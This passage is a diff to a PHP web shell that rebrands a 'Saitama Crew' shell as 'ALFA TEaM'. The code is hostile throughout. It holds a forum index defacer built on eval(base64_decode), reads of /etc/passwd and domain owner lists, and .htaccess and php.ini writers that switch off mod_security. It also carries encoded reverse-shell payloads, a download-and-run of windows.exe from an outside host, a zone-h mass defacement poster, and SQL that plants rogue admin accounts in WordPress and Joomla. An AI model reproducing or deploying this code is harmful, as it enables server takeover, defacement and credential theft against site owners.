+echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target </font><font color=red>\" ".$path."/pwreset.php \"</font><br/><font color=\"#FFFFFF\"> and reset password with email</font> => <font color=red>solevisible@fbi.gov</font><br/><font color=\"#FFFFFF\">and go to</font> <font color=red>\" ".$path."/".$fname." \"</font></b></center><br><br>";
 }}}}
-if(isset($_POST['saitama1']) && ($_POST['saitama1'] == 'vb')){
+if(isset($_POST['alfa1']) && ($_POST['alfa1'] == 'vb')){
 echo __pre();
 
 echo "<center><center><div class='txtfont_header'>| vBulletin |</div>
@@ -3493,16 +3494,16 @@ $table = array('td1' =>
 );
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
-<textarea name='index' rows='19' cols='103'><title>Hacked By Ndraa & StrezzBoy</title><b>Hacked By Ndraa & StrezzBoy</b></textarea><br>
+<textarea name='index' rows='19' cols='103'><title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><br>
 <input type='submit' value=' '></form></center></center>";
-if($_POST['saitama8']=='>>'){
+if($_POST['alfa8']=='>>'){
 $s0levisible="Powered By Solevisible";
-$dbu = $_POST['saitama2'];
-$dbn = $_POST['saitama3'];
-$dbp = $_POST['saitama4'];
-$dbh = $_POST['saitama5'];
-$index = $_POST['saitama6'];
-$prefix = $_POST['saitama7'];
+$dbu = $_POST['alfa2'];
+$dbn = $_POST['alfa3'];
+$dbp = $_POST['alfa4'];
+$dbh = $_POST['alfa5'];
+$index = $_POST['alfa6'];
+$prefix = $_POST['alfa7'];
 $index=str_replace("\'","'",$index);
 $set_index = "{\${eval(base64_decode(\'";
 $set_index .= __ZW5jb2Rlcg("echo \"$index\";");
@@ -3519,7 +3520,7 @@ __alert('VB index changed...!');
 }
 }
 }
-if(isset($_POST['saitama2']) && ($_POST['saitama2'] == 'mybb')) {
+if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'mybb')) {
 echo __pre();
 
 echo "<center><center><div class='txtfont_header'>| Mybb |</div>
@@ -3537,13 +3538,13 @@ $table = array('td1' =>
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
 <textarea name=mybbindex rows='19' cols='103'>
-<title>Hacked By Ndraa & StrezzBoy</title><b>Hacked By Ndraa & StrezzBoy</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
-if(isset($_POST['saitama6'])){
-$mybb_dbh = $_POST['saitama6'];
-$mybb_dbu = $_POST['saitama7'];
-$mybb_dbn = $_POST['saitama8'];
-$mybb_dbp = $_POST['saitama9'];
-$mybb_index = $_POST['saitama10'];
+<title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
+if(isset($_POST['alfa6'])){
+$mybb_dbh = $_POST['alfa6'];
+$mybb_dbu = $_POST['alfa7'];
+$mybb_dbn = $_POST['alfa8'];
+$mybb_dbp = $_POST['alfa9'];
+$mybb_index = $_POST['alfa10'];
 if(!empty($mybb_dbh)&&!empty($mybb_dbu)&&!empty($mybb_dbn)&&!empty($mybb_index)){
 $conn=@mysqli_connect($mybb_dbh,$mybb_dbu,$mybb_dbp,$mybb_dbn) or die(mysqli_error($conn));
 $prefix="mybb_";
@@ -3554,13 +3555,13 @@ __alert('MyBB index changed...!');
 }
 }
 echo "</div>";
-saitamafooter();
+alfafooter();
 }
-function saitamaproc()
+function alfaproc()
 {
-saitamahead();
+alfahead();
 echo "<Div class=header><br><center>";
-if(empty($_POST['ajax'])&&!empty($_POST['saitama1']))
+if(empty($_POST['ajax'])&&!empty($_POST['alfa1']))
 $_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
 if($GLOBALS['sys']=="win"){
 $process=array(
@@ -3590,23 +3591,23 @@ foreach($process as $n => $link){
 echo '<a href="javascript:void(0);" onclick="g(\'proc\',null,\''.$link.'\')"> | '.$n.' | </a>';
 }
 echo "</center><br>";
-if(!empty($_POST['saitama1'])){
+if(!empty($_POST['alfa1'])){
 echo "<pre class='ml1' style='margin-top:5px' >";
 if($GLOBALS["glob_chdir_false"]&&!empty($_POST["c"])){$cmd = "cd '".addslashes($_POST["c"])."';";}
-echo saitamaEx($cmd.$_POST['saitama1'], true);
+echo alfaEx($cmd.$_POST['alfa1'], true);
 echo '</pre>';
 }
 echo "</div>";
-saitamafooter();
+alfafooter();
 }
-function saitamasafe(){
-saitamahead();
+function alfasafe(){
+alfahead();
 echo "<div class=header><center><br><div class='txtfont_header'>| Auto ByPasser |</div>";
 echo '<h3><a href=javascript:void(0) onclick="g(\'safe\',null,\'php.ini\',null)">| PHP.INI | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,\'ini\')">| .htaccess(apache) | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,\'pl\')">| .htaccess(LiteSpeed) |</a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,null,\'passwd\')">| Read-Passwd | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,null,null,\'users\')">| Read-Users | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,null,null,null,\'valiases\')">| Get-User | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,null,null,null,null,null,\'domains\')">| Get-Domains | </a></center></h3>';
-if(!empty($_POST['saitama8']) && isset($_POST['saitama8']) == 'domains'){
-if(!_saitama_file_exists("/etc/virtual/domainowners")){
+if(!empty($_POST['alfa8']) && isset($_POST['alfa8']) == 'domains'){
+if(!_alfa_file_exists("/etc/virtual/domainowners")){
 echo __pre();
-$solevisible9 = _saitama_file('/etc/named.conf');
+$solevisible9 = _alfa_file('/etc/named.conf');
 if(is_array($solevisible9)){
 foreach($solevisible9 as $solevisible13){
 if(@eregi('zone',$solevisible13)){
@@ -3617,17 +3618,17 @@ echo $solevisible14[1][0].'<br>';
 }
 }else{
 echo __pre();
-$users = _saitama_file("/etc/virtual/domainowners");
+$users = _alfa_file("/etc/virtual/domainowners");
 if(is_array($users)){
 foreach($users as $boz){
 $dom = explode(":",$boz);
 echo $dom[0]."\n";}}}}
-if(!empty($_POST['saitama6']) && isset($_POST['saitama6']) == 'valiases'){
+if(!empty($_POST['alfa6']) && isset($_POST['alfa6']) == 'valiases'){
 echo '
 <form onsubmit="g(\'safe\',null,null,null,null,null,null,\'valiases\',this.site.value,null,\'>>\'); return false;" method="post" /><center><div class="txtfont">Url: </font><input type="text" placeholder="site.com" name="site" /> <input type="submit" value=" " name="go" /></form></center>';
-if(isset($_POST['saitama9']) && $_POST['saitama9'] == '>>'){
-if(!_saitama_file_exists("/etc/virtual/domainowners")){
-$site = trim($_POST['saitama7']);
+if(isset($_POST['alfa9']) && $_POST['alfa9'] == '>>'){
+if(!_alfa_file_exists("/etc/virtual/domainowners")){
+$site = trim($_POST['alfa7']);
 $rep = str_replace(array("https://","http://","www."),"",$site);
 $user = "";
 if(function_exists("posix_getpwuid") && function_exists("fileowner")){
@@ -3635,25 +3636,25 @@ if(function_exists("posix_getpwuid") && function_exists("fileowner")){
 		$user = $user['name'];
 	}
 }else{
-	if(_saitama_can_runCommand(true,true)){
-		$user = saitamaEx("stat -c '%U' /etc/valiases/".$rep);
+	if(_alfa_can_runCommand(true,true)){
+		$user = alfaEx("stat -c '%U' /etc/valiases/".$rep);
 	}
 }
 if(!empty($user)&&$user!='root'){
-echo __pre()."<center><table border='1'><tr><td><b><font color=\"#00ffff\">User: </b></font></td><td><b><font color=\"#E6E6FA\">{$user}</font></b></td></tr><tr><td><b><font color=\"#00ffff\">site: </b></font></td><td><b><font color=\"#E6E6FA\">{$rep}</font></b></td></tr></table></center>";
+echo __pre()."<center><table border='1'><tr><td><b><font color=\"#FFFFFF\">User: </b></font></td><td><b><font color=\"#FF0000\">{$user}</font></b></td></tr><tr><td><b><font color=\"#FFFFFF\">site: </b></font></td><td><b><font color=\"#FF0000\">{$rep}</font></b></td></tr></table></center>";
 }else {echo __pre().'<center><b>No such file or directory Or Disable Functions is not NONE...</b></center>';}
 }else{
-$site = trim($_POST['saitama7']);
+$site = trim($_POST['alfa7']);
 $rep = str_replace(array("https://","http://","www."),"",$site);
-$users = _saitama_file("/etc/virtual/domainowners");
+$users = _alfa_file("/etc/virtual/domainowners");
 foreach($users as $boz){
 $ex = explode(":",$boz);
 if($ex[0] == $rep){
 echo __pre()."<center><table border='1'>
-<tr><td><b><font color=\"#00ffff\">User: </b></font></td><td><b><font color=\"#E6E6FA\">".trim($ex[1])."</font></b></td></tr>
-<tr><td><b><font color=\"#00ffff\">site: </b></font></td><td><b><font color=\"#E6E6FA\">{$rep}</font></b></td></tr></table></center>";break;}}}}}
-if(!empty($_POST['saitama5']) && isset($_POST['saitama5'])){
-if(!_saitama_file_exists("/etc/virtual/domainowners")){
+<tr><td><b><font color=\"#FFFFFF\">User: </b></font></td><td><b><font color=\"#FF0000\">".trim($ex[1])."</font></b></td></tr>
+<tr><td><b><font color=\"#FFFFFF\">site: </b></font></td><td><b><font color=\"#FF0000\">{$rep}</font></b></td></tr></table></center>";break;}}}}}
+if(!empty($_POST['alfa5']) && isset($_POST['alfa5'])){
+if(!_alfa_file_exists("/etc/virtual/domainowners")){
 echo __pre();
 $i = 0;
 while ($i < 60000) {
@@ -3663,13 +3664,13 @@ while (list ($key, $vl) = each($line)){
 echo $vl."\n";
 break;}}$i++;}
 }else{echo __pre();
-$users = _saitama_file("/etc/virtual/domainowners");
+$users = _alfa_file("/etc/virtual/domainowners");
 foreach($users as $boz){
 $user = explode(":",$boz);
 echo trim($user[1]).'<br>';}}}
-if(!empty($_POST['saitama4']) && isset($_POST['saitama4'])){
+if(!empty($_POST['alfa4']) && isset($_POST['alfa4'])){
 echo __pre();
-if(_saitama_can_runCommand(true,true)){echo __read_file("/etc/passwd");}elseif(function_exists("posix_getpwuid")){
+if(_alfa_can_runCommand(true,true)){echo __read_file("/etc/passwd");}elseif(function_exists("posix_getpwuid")){
 for($uid=0;$uid<60000;$uid++){
 $ara = @posix_getpwuid($uid);
 if(!empty($ara)){
@@ -3677,20 +3678,20 @@ while(list ($key, $val) = each($ara)){
 echo "$val:";
 }echo "\n";}}
 }else{__alert('failed...');}}
-if(!empty($_POST['saitama2']) && isset($_POST['saitama2'])){
-@__write_file($GLOBALS['cwd'].".htaccess","#Generated By Ndraa and StrezzBoy\n<IfModule mod_security.c>\nSec------Engine Off\nSec------ScanPOST Off\n</IfModule>");
+if(!empty($_POST['alfa2']) && isset($_POST['alfa2'])){
+@__write_file($GLOBALS['cwd'].".htaccess","#Generated By Sole Sad and Invisible\n<IfModule mod_security.c>\nSec------Engine Off\nSec------ScanPOST Off\n</IfModule>");
 echo '<center><b><big>htaccess for Apache created...!</center></b></big>';
 }
-if(!empty($_POST['saitama1'])&& isset($_POST['saitama1'])){
-@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Ndraa & StrezzBoy(Saitama Crew Xploit)");
+if(!empty($_POST['alfa1'])&& isset($_POST['alfa1'])){
+@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Sole Sad & Invisible(ALFA TEaM)");
 echo '<center><b><big> php.ini created...!</center></b></big>';
 }
-if(!empty($_POST['saitama3']) && isset($_POST['saitama3'])){
-@__write_file($GLOBALS['cwd'].".htaccess","#Generated By Ndraa and StrezzBoy\n<Files *.php>\nForceType application/x-httpd-php4\n</Files>\n<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
+if(!empty($_POST['alfa3']) && isset($_POST['alfa3'])){
+@__write_file($GLOBALS['cwd'].".htaccess","#Generated By Sole Sad and Invisible\n<Files *.php>\nForceType application/x-httpd-php4\n</Files>\n<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
 echo '<center><b><big>htaccess for Litespeed created...!</center></b></big>';
 }
 echo "<br></div>";
-saitamafooter();
+alfafooter();
 }
 function __get_resource($content){
 return @gzinflate(__ZGVjb2Rlcg($content));
@@ -3707,7 +3708,7 @@ $err = "<font color='red'>[ Failed...! ]</font>";
 if($evalOptions!="") $evalOptions = $evalOptions." ";
 if($evalArguments!="") $evalArguments = " ".$evalArguments;
 if($evalType=="c"){
-$tmpdir = saitama_TEMPDIR;
+$tmpdir = ALFA_TEMPDIR;
 chdir($tmpdir);
 if(is_writable($tmpdir)){
 $uniq = substr(md5(time()),0,8);
@@ -3718,11 +3719,11 @@ $ext = ($GLOBALS['sys']=='win')? ".exe":".out";
 $pathres = $filename.$ext;
 $evalOptions = "-o ".$pathres." ".$evalOptions;
 $cmd = "gcc ".$evalOptions.$path;
-saitamaEx($cmd);
+alfaEx($cmd);
 if(is_file($pathres)){
 if(chmod($pathres, 0755)){
 $cmd = $pathres.$evalArguments;
-saitamaEx($cmd);
+alfaEx($cmd);
 }else{$res = $err;}
 unlink($pathres);
 }else{$res = $err;}
@@ -3731,7 +3732,7 @@ unlink($path);
 }
 return $res;
 }elseif($evalType=="java"){
-$tmpdir = saitama_TEMPDIR;
+$tmpdir = ALFA_TEMPDIR;
 chdir($tmpdir);
 if(is_writable($tmpdir)){
 if(preg_match("/class\ ([^{]+){/i",$evalCode, $r)){
@@ -3745,12 +3746,12 @@ $evalCode = "class ".$filename." { ".$evalCode . " } ";
 $path = $filename.".java";
 if(__write_file($path, $evalCode)){
 $cmd = "javac ".$evalOptions.$path;
-saitamaEx($cmd);
+alfaEx($cmd);
 $pathres = $filename.".class";
 if(is_file($pathres)){
 if(chmod($pathres, 0755)){
 $cmd = "java ".$filename.$evalArguments;
-saitamaEx($cmd);
+alfaEx($cmd);
 }else{$res = $err;}
 unlink($pathres);
 }else{$res = $err;}
@@ -3761,8 +3762,8 @@ return $res;
 }
 return false;
 }
-function saitamaconnect(){
-saitamahead();
+function alfaconnect(){
+alfahead();
 $php="7VZta9swEP5e6H9QjaE2S5uXfhg0pDBYPw7KVtiHtjOOLNcitqVJ8pKxpb99d36L4zid17WwQV1wrbvTo0e6Oz1hSgnlKSaFMjy9d0bu9PBAM+MZnjAv5gk3hU3MPZ7ImFNuvDDOdOSg1Ta+umdGkxlhKxmLgDkWsQaktOchFL3js7O3OFj6MEizOMYBaw50BAMLUIAJub78+GG2Mkwl06tP49nxrX31+f3F8bR0g206nPN0CJNOuIXTE5z9QN7FoU+umZ8QHbE4Jg/k8AD9PCQOFVlqnIqyS2ZAyyU/Dg8IPLYEgNI3LU05I6saGRzBogFa1oTFmu1BnXSi6pvRXRO5No/vtpfw6SJfomAdZik1XKQeW3FttHMsaWpiLxRqcew2FuIBTN748vSgBzEK74yc4IYBxzjjtru0j5p2KTRfeVANmgeO2wFQUkTe1dlsGGHatVGQC08LuoCa0kx9Y8qxDJXnw+HoNP87t8gp0IeaYUqlovgP8yoiFURZkyKDw9YDclYztenOQj6lTGJcczcQYkQslsBAZ3MYOTKSXpb6CXPcARkBpptv0lrydLMPfMKl4oY5NgV2CdCFtNElHskpsS6sahF8lhGPGZ4oOQKk0Ici2UKqiyLE1ANic3J97orde4lvaORYQxrcEufmy62+e+MOOfYWnpVS7g5ujh1gGYB7U1VtdK69gCsHIgGCRtV3R7QtAGt7r62oTRsYxZPmEduyPEysFov8/En2RnzNIMIlc8jgooWP6AUNHxr7coWTkIi1k4TWxGbGRHNv60ZWaSw0a+WgMtalU2xxbzU059oB1ryvlP/dGZHZRflpSS4ZJM5SFtTZuMOxRMek27G1gFTY5EpQT0iWAstogKtiUXDZjMSUHEGmFdMiUxTYSqyY7d7Hp9Fe8xi6B0UAweCygp7oFTnuHTnpFUlbQWVPGZXt9lJ+QzIRYhaxyIrvgpXbXVO28uss5Tms9lBSbHdCzTFmFO4U5UPkEl8MXqheXS3MU6+xgvL3dCvHmwDggyKO6q42rOqtyorN21HrxwjU2+vDog5+nAp9EovJn7CY/D2Ljl7XXb3eeQEUp73PM97r2S6gvFcrb61p6+YPiEo9Ufa31TNEOSsaPSrvfZbia0v/nknb9LNr207uXrWtib9P2+AHa1910z3UrYeQ6VchexEh008SMv0kIdMvLmS65+Wt/ych0/+EkP2ORV8he2nN+gU=";
 $python="pVRtT9swEP6cSv0PxptWR80M7YY0wYJUQZjQBlRtp30AVqXOpYmWOpHtQPnCb5/tJG1AHUKaqra+V99z95zf7e2XUuwvUr4P/B4VjyrJebeTropcKCTAk+WiEDkDKb1cevJRf3P2B5Sn0hV0O4WPcbeT2N8IYiQTyDLC3KNuxzFx/jaejvMCOGGe9fFnotTZVZSX6pnTxTgwahBilzrlL7WuvkmAKgVHRk2rlFRAGBG336h0upZqVSjiUuAsj4D0ShV//NLTeSoIIVNpzmsMaYxySXm4gj0fc4WNzol9RuM0A54Tc7ujPXRjFKwIhrVt3CyYXPprBWJ1PJ4O/N778a+zk95xbdWqY9tymaCPKfr6AfelEiR2+xidtIXhVjIXQSbBFvCQ6NuR6aAVHSUeq4MjdGkC2D0ZHAw/uzQCCxFbiNgW68CaQaFq/yKUstI2uR2DWWMjwj05qDXOwhdAJYSCJQSz6BaRm9+38q7vYk94cRYupXG4+HZ1PQlOR9PAreN0qkWTo+5lEaqEpjJKBVnQpcjLggxcd+NkmsmSF9bGqEcJPCL/mmDj18Ki8xl+WVYKt11JqVDII4tUnw3WOruRKkebB9XkOg+11HCkqeBoSz58y3FfF78ExR4Mz/CJ3omlr5lBQ7G810tV9XXp+v7Q7oe/vBncdTuQtSyf2hYn0YehddGVwDpVuhtm6VKuSKFP0q+2kVZ/pJZG5/OLq2BWryqdXp9+n09nk2B0aWI0TGUsebEJmF7/mBuvdsx8EvycBqOzs4lnLn1ZvaSawREh+IDaD/YKOwBJs1TvAieHRjLM1Csfur7uAjPEsyvT4qB5R6jMAAqLbTu8navXUIDgJzTK4hDNIFyhqZkvetIT2M2JLSFeC8ebp2F3ls3D8KwZdmAGJtLEzTkHpghJ6mbsxnn4Bpzy/3C+Fv5GnNL9Cw==";
 $perl="lZLRjpNAFIav26TvMOJsC8kYWr1bpJFQ3DRrS8OwGmOVsPSsTKQDgVm3m+722Z0BVifGGL0755/Dd+Abnj+zb5vavmbcBv4dVVAXo+FtA2gZnp/TMvsGwhkNcdm4+EuoqiZ3DThUZS1QHEQr9yCg3jsbOnMnW7z5sNjOJ05/LkOnJTc5esEM+TS7MRXqtLfvZMysY4s788MV3QT+GbIvDedRLhHuVxBVXYry+p6nezAnIqsmliQ07SuZlIw3b5PlOojJmIb+ZULjKPBWBAvr4WHHwLS6bW+86OK9686s42g4wJWLVf9p+lmeDhoQilZWCkfDd4kCSSANkyi4ooG3WERkpkAD+RE7OaTG092uThg3cUWWazWSeOuPlrZ1ULBGAJfjr/Q0zTKQm3xCrW65JPrEOCGvuElRDOke0RyKAp223CDTdqisgCMaL5ZrYrwe+4bzFIRXMTHmehJEUZ/I5+AAGZJqtfVZUTZg+pbTFfRnoehaI8laJ6lWB2QCTWUlLweK5pfYl38Si/O+nXUtcxkHkaSilNpyXQpO3d+cYqafZyXnkKn7wamet/boP9gze3vzMTUs5ynp9elR709FfxP4f946W3BU+kz5Jz3+AA==";
@@ -3776,20 +3777,20 @@ echo "<form onSubmit=\"g('connect',null,this.selectCb.value,this.server.value,th
 $cbArr = array("php"=>"Php","perl"=>"Perl","python"=>"Python","ruby"=>"Ruby","c"=>"C","java"=>"Java","node"=>"NodeJs","bcwin"=>"Windows");
 foreach($cbArr as $key=>$val){echo("<option value='{$key}' ".($GLOBALS['sys']=='win'?'selected':'').">{$val}</option>");}
 echo "</select> <div id='bcipAction' style='display:inline-block;'><div class=\"txtfont\">IP:</div> <input type='text' style='text-align:center;' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'></div> <div class=\"txtfont\">Port: </div> <input type='text' size='5' style='text-align:center;' name='port' value='2012'> <input type='submit' value=' '></form><p><div id='bcStatus'><small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small></div></p></center></b></font><br>";
-if(isset($_POST['saitama1'])&&!empty($_POST['saitama1'])){
-$lang = $_POST['saitama1'];
-$ip = $_POST['saitama2'];
-$port = $_POST['saitama3'];
-$arg = ($_POST['saitama4']=='bind'?$port:$port.' '.$ip);
-$tmpdir = saitama_TEMPDIR;
+if(isset($_POST['alfa1'])&&!empty($_POST['alfa1'])){
+$lang = $_POST['alfa1'];
+$ip = $_POST['alfa2'];
+$port = $_POST['alfa3'];
+$arg = ($_POST['alfa4']=='bind'?$port:$port.' '.$ip);
+$tmpdir = ALFA_TEMPDIR;
 $name = $tmpdir.'/'.$lang.uniqid().rand(1,99999);
 $allow = array('perl','ruby','python','node');
 eval('$lan=$'.$lang.';');
 if(in_array($lang,$allow)){
 if(__write_file($name,__get_resource($lan))){
-if(_saitama_can_runCommand(true,true)){
+if(_alfa_can_runCommand(true,true)){
 $os = ($GLOBALS['sys']!='win')?'1>/dev/null 2>&1 &':'';
-$out = saitamaEx("$lang $name $arg $os");
+$out = alfaEx("$lang $name $arg $os");
 if($out==''){$out="<font color='green'><center>[ Finished...! ]</center></font>";}
 echo("<pre class='ml1' style='margin-top:5px'>{$out}</pre>");
 }
@@ -3803,13 +3804,13 @@ $out = nl2br(bcinit($lang, $code,'',''));
 echo("<pre class=ml1 style='margin-top:5px'><center>{$out}</center></pre>");
 }
 if($lang=='bcwin'){
-$saitama = new saitamaCURL();
-$s = $saitama->Send('http://solevisible.com/bc/windows.exe');
-$tmpdir = saitama_TEMPDIR;
+$alfa = new AlfaCURL();
+$s = $alfa->Send('http://solevisible.com/bc/windows.exe');
+$tmpdir = ALFA_TEMPDIR;
 $f = @fopen($tmpdir.'/bcwin.exe','w+');
 @fwrite($f, $s);
 @fclose($f);
-$out = saitamaEx($tmpdir."/bcwin.exe ".$_POST['saitama2']." ".$_POST['saitama3']);
+$out = alfaEx($tmpdir."/bcwin.exe ".$_POST['alfa2']." ".$_POST['alfa3']);
 }
 if($lang=='php'){
 echo "<pre class=ml1 style='margin-top:5px'>";
@@ -3823,10 +3824,10 @@ echo "</pre>";
 }
 }
 echo "</div>";
-saitamafooter();
+alfafooter();
 }
-function saitamazoneh(){
-saitamahead();
+function alfazoneh(){
+alfahead();
 echo '<div class=header>';
 if(!function_exists('curl_version')){
 echo "<pre class=ml1 style='margin-top:5px'><center><font color=red><b><big><big>PHP CURL NOT EXIST ~ ZONE H MASS POSTER DOES NOT WORK</b></font></big></big></center></pre>";
@@ -3836,7 +3837,7 @@ $reason = array('Heh...just for fun!','Revenge against that website','Political 
 echo '
 <center><br><div class="txtfont_header">| Zone-h Mass Poster |</div><center><br>
 <form action="" method="post" onsubmit="g(\'zoneh\',null,this.defacer.value,this.hackmode.value,this.reason.value,this.domain.value,\'>>\'); return false;">
-<input type="text" name="defacer" size="67" id="text" placeholder="Saitama Crew Xploit 2012" />
+<input type="text" name="defacer" size="67" id="text" placeholder="ALFA TEaM 2012" />
 <br>
 <select id="text" name="hackmode" style="width:400px;">';
 $x=1;
@@ -3848,45 +3849,45 @@ echo '</select><br>
 <textarea name="domain" cols="90" rows="20" placeholder="Domains..."></textarea><br>
 <p><input type="submit" value=" " name="go" /></p>
 </form></center>';
-if($_POST['saitama5'] && $_POST['saitama5'] == '>>'){
+if($_POST['alfa5'] && $_POST['alfa5'] == '>>'){
 ob_start();
-$hacker = $_POST['saitama1'];
-$method = $_POST['saitama2'];
-$neden = $_POST['saitama3'];
-$site = $_POST['saitama4'];
+$hacker = $_POST['alfa1'];
+$method = $_POST['alfa2'];
+$neden = $_POST['alfa3'];
+$site = $_POST['alfa4'];
 if(empty($hacker)){
-die (__pre()."<center><b><font color =\"#E6E6FA\">[+] YOU MUST FILL THE ATTACKER NAME [+]</font></b></center>");
+die (__pre()."<center><b><font color =\"#FF0000\">[+] YOU MUST FILL THE ATTACKER NAME [+]</font></b></center>");
 }elseif($method == "------------------------------------SELECT-------------------------------------"){
-die(__pre()."<center><b><font color =\"#E6E6FA\">[+] YOU MUST SELECT THE METHOD [+]</b></font></center>");
+die(__pre()."<center><b><font color =\"#FF0000\">[+] YOU MUST SELECT THE METHOD [+]</b></font></center>");
 }elseif($neden == "------------------------------------SELECT-------------------------------------"){
-die(__pre()."<center><b><font color =\"#E6E6FA\">[+] YOU MUST SELECT THE REASON [+]</b></font></center>");
+die(__pre()."<center><b><font color =\"#FF0000\">[+] YOU MUST SELECT THE REASON [+]</b></font></center>");
 }elseif(empty($site)){
-die(__pre()."<center><b><font color =\"#E6E6FA\">[+] YOU MUST INTER THE SITES LIST [+]<font></b></center>");
+die(__pre()."<center><b><font color =\"#FF0000\">[+] YOU MUST INTER THE SITES LIST [+]<font></b></center>");
 }
 $i = 0;
 $sites = explode("\n", $site);
-$saitama = new saitamaCURL();
+$alfa = new AlfaCURL();
 while($i < count($sites)){
 if(substr($sites[$i], 0, 4) != "http"){
 $sites[$i] = "http://".$sites[$i];
 }
-$saitama->Send("http://www.zone-h.com/notify/single","post","defacer=".$hacker."&domain1=". $sites[$i]."&hackmode=".$method."&reason=".$neden);
+$alfa->Send("http://www.zone-h.com/notify/single","post","defacer=".$hacker."&domain1=". $sites[$i]."&hackmode=".$method."&reason=".$neden);
 ++$i;
 }
 echo __pre()."<center><font color =\"#00A220\"><b>[+] Sending Sites To Zone-H Has Been Completed Successfully !!![+]</b><font></center>";
 }
 echo "</div>";
-saitamafooter();
+alfafooter();
 }
-function saitamapwchanger(){
-saitamahead();
+function alfapwchanger(){
+alfahead();
 
 echo '<div class=header><center><br><div class="txtfont_header">| Add New Admin |</div>
 <center><h3>';
 $vals = array('WordPress' => array('wp',2),'Joomla' => array('joomla',3),'vBulletin' => array('vb',5),'phpBB' => array('phpbb',6),'WHMCS' => array('whmcs',7),'MyBB' => array('mybb',8),'Php Nuke' => array('nuke',9),'Drupal' => array('drupal',10),'SMF' => array('smf',11));
-saitama_Create_A_Tag('pwchanger',$vals);
+Alfa_Create_A_Tag('pwchanger',$vals);
 echo '</h3></center>';
-if(isset($_POST['saitama1'])&&$_POST['saitama1']=='wp'){
+if(isset($_POST['alfa1'])&&$_POST['alfa1']=='wp'){
 
 echo __pre().'<center><center><div class="txtfont_header">| WordPress |</div>
 <p>'.getConfigHtml('wp').'</p><form onSubmit="g(\'pwchanger\',null,\'wp\',\'>>\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,this.email.value,this.prefix.value);return false;" method="POST">';
@@ -3909,14 +3910,14 @@ $table = array('td1' =>
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form>';
-if ($_POST['saitama2'] && $_POST['saitama2'] == '>>'){
-$localhost = $_POST['saitama3'];
-$database = $_POST['saitama4'];
-$username = $_POST['saitama5'];
-$password = $_POST['saitama6'];
-$admin = $_POST['saitama8'];
-$SQL = $_POST['saitama9'];
-$prefix = $_POST['saitama10'];
+if ($_POST['alfa2'] && $_POST['alfa2'] == '>>'){
+$localhost = $_POST['alfa3'];
+$database = $_POST['alfa4'];
+$username = $_POST['alfa5'];
+$password = $_POST['alfa6'];
+$admin = $_POST['alfa8'];
+$SQL = $_POST['alfa9'];
+$prefix = $_POST['alfa10'];
 $conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
 $solevisible=@mysqli_query($conn,"insert into ".$prefix."users (ID,user_login,user_pass,user_email) values(null,'$admin','d4a590caacc0be55ef286e40a945ea45','$SQL')") or die(mysqli_error($conn));
 $solevisible=@mysqli_query($conn,"select ID from ".$prefix."users where user_login='".$admin."'") or die(mysqli_error($conn));
@@ -3930,7 +3931,7 @@ if($solevisible){
 __alert('Success... '.$admin.' is created...');}
 }
 }
-if($_POST['saitama2'] && $_POST['saitama2'] == 'joomla'){
+if($_POST['alfa2'] && $_POST['alfa2'] == 'joomla'){
 
 echo __pre().'<center><center><div class="txtfont_header">| Joomla |</div><p><p>'.getConfigHtml('joomla').'</p><form onSubmit="g(\'pwchanger\',null,\'>>\',\'joomla\',this.localhost.value,this.database.value,this.username.value,this.password.value,null,this.admin.value,this.email.value,this.prefix.value);return false;" method="POST">';
 $table = array('td1' =>
@@ -3952,14 +3953,14 @@ $table = array('td1' =>
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
-if ($_POST['saitama1'] && $_POST['saitama1'] == '>>'){
-$localhost = $_POST['saitama3'];
-$database = $_POST['saitama4'];
-$username = $_POST['saitama5'];
-$password = $_POST['saitama6'];
-$admin = $_POST['saitama8'];
-$SQL = $_POST['saitama9'];
-$prefix = $_POST['saitama10'];
+if ($_POST['alfa1'] && $_POST['alfa1'] == '>>'){
+$localhost = $_POST['alfa3'];
+$database = $_POST['alfa4'];
+$username = $_POST['alfa5'];
+$password = $_POST['alfa6'];
+$admin = $_POST['alfa8'];
+$SQL = $_POST['alfa9'];
+$prefix = $_POST['alfa10'];
 $conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
 $solevisible=@mysqli_query($conn,"insert into ".$prefix."users (id,name,username,email,password) values(null,'Super User','".$admin."','".$SQL."','d4a590caacc0be55ef286e40a945ea45')") or die(mysqli_error($conn));
 $solevisible=@mysqli_query($conn,"select id from ".$prefix."users where username='".$admin."'") or die(mysqli_error($conn));
@@ -3973,7 +3974,7 @@ if($solevisible){
 __alert('Success... '.$admin.' is created...');}
 }
 }
-if($_POST['saitama4'] && $_POST['saitama4'] == 'vb'){
+if($_POST['alfa4'] && $_POST['alfa4'] == 'vb'){
 
